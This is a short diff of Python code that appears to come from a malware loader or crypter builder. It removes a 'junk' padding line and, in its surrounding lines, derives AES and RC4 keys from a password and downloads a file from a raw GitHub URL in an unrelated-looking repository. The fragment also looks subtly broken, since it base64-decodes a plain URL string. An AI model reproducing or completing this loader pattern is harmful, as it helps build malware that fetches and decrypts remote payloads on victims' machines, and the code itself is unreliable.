@@ -64,7 +64,6 @@ salt = base64.b64decode({repr(base64.b64encode(salt).decode())})
 aes_key = derive_key(password, salt)
 rc4_key = derive_key(password, salt, length=16)
 
-junk = '{junk_b64}'
 file_url = 'https://raw.githubusercontent.com/whupsxd/asasa/refs/heads/main/loliiiiii.txt'
 
 data = download(base64.b64decode(file_url))
